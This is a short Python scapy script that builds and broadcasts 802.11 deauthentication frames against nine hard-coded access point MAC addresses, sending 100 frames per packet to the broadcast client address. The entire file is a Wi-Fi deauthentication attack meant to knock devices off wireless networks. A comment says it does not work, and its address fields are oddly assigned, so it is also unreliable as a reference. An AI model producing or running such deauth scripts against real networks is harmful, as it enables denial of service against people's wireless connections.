#! /usr/bin/env python3

# Ref: http://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/scapy_wifi/scapy_tut.html
# Doesn't work, client device doesn't get disconnected from wifi

import sys
from scapy.layers.dot11 import *

IFACE = 'wlp9s0mon'
AP_MAC0 = '54:8A:BA:27:5D:01'
AP_MAC1 = '54:8A:BA:27:61:21'
AP_MAC2 = '54:8A:BA:27:55:41'
AP_MAC3 = '54:8A:BA:27:56:E1'
AP_MAC4 = '54:8A:BA:27:5D:61'
AP_MAC5 = '54:8A:BA:27:66:C1'
AP_MAC6 = '54:8A:BA:27:68:81'
AP_MAC7 = '54:8A:BA:27:5F:01'
AP_MAC8 = '54:8A:BA:27:63:41'

CLIENT_MAC = 'ff:ff:ff:ff:ff:ff'
#CLIENT_MAC = '45:09:10:51:9b:3e'

packet1 = RadioTap() / \
         Dot11(type=0,
            subtype=12,                     # Deauth packet 0x1100
            addr1=CLIENT_MAC,
            addr2=AP_MAC0,
            addr3=AP_MAC1,
            addr4=AP_MAC2,
            ) / \
         Dot11Deauth(reason=7)              # Arbitrary reason fro deauth

packet2 = RadioTap() / \
         Dot11(type=0,
            subtype=12,                     # Deauth packet 0x1100
            addr1=CLIENT_MAC,
            addr2=AP_MAC3,
            addr3=AP_MAC4,
            addr4=AP_MAC5,
            ) / \
         Dot11Deauth(reason=7)              # Arbitrary reason fro deauth

packet3 = RadioTap() / \
         Dot11(type=0,
            subtype=12,                     # Deauth packet 0x1100
            addr1=CLIENT_MAC,
            addr2=AP_MAC6,
            addr3=AP_MAC7,
            addr4=AP_MAC8
            ) / \
         Dot11Deauth(reason=7)              # Arbitrary reason fro deauth

#while True:
sendp(packet1, iface=IFACE, count=100, inter=0.01)
sendp(packet2, iface=IFACE, count=100, inter=0.01)
sendp(packet3, iface=IFACE, count=100, inter=0.01)